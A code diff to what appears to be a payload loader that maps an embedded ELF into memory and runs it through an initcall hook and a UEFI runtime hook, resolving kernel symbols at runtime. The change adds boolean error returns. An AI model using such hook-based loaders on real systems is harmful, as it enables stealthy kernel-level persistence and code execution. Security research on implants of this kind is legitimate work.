@@ -204,7 +204,7 @@ size_t get_virtualsize(void *elf)
 }
 
 /* process */
-void setup_elf(void *elf, size_t len)
+bool setup_elf(void *elf, size_t len)
 {
     Elf64_Ehdr *ehdr; 
     Elf64_Phdr *phdr;
@@ -224,7 +224,7 @@ void setup_elf(void *elf, size_t len)
     ehdr = (Elf64_Ehdr *) body;
     /* Apply the relocations by searching through the PHDRs for a PT_DYNAMIC */
     if (!do_relocs(body)) {
-        return;
+        return false;
     }
 
     /* Go through the program headers to set correct page permissions for each
@@ -250,13 +250,14 @@ void setup_elf(void *elf, size_t len)
 
             default:
                 PRINTK("Unsupported page permission\n");
-                return;
+                return false;
         }
     }
 
     /* Transfer control */
     PRINTK("Entrypoint: %lx\n", body + ehdr->e_entry);
     start = (start_t)(body + ehdr->e_entry);
+    return true;
 }
 
 /* Resolve the required symbols for run_elf() */
@@ -284,20 +285,20 @@ bool resolve_required(void)
     return true;
 }
 
-void setup_payload(void)
+bool setup_payload(void)
 {
     if (payload_len <= 0) {
         PRINTK("No payload defined\n");
-        return;
+        return false;
     }
     PRINTK("Loading payload\n");
 
     if (!resolve_required()) {
         PRINTK("Can't get Symbols needed.\n");
-        return;
+        return false;
     }
 
-    setup_elf(payload, payload_len);
+    return setup_elf(payload, payload_len);
 }
 
 void run_payload(void)
@@ -314,8 +315,9 @@ int via_initcall_handler(void)
     LOOKUP(regulator_init_complete);
     res = regulator_init_complete();
 
-    setup_payload();
-    run_payload();
+    if (setup_payload()) {
+        run_payload();
+    }
     return res;
 }
 
@@ -326,7 +328,7 @@ int via_uefi_runtime(void)
     void *ew;
     unsigned long flags;
     PRINTK("Called via UEFI Runtime hook\n");
-    setup_payload();
+    if (!setup_payload()) return 0;
     LOOKUP(execute_in_process_context);
     LOOKUP(irq_enter_rcu);
     LOOKUP(irq_exit_rcu);
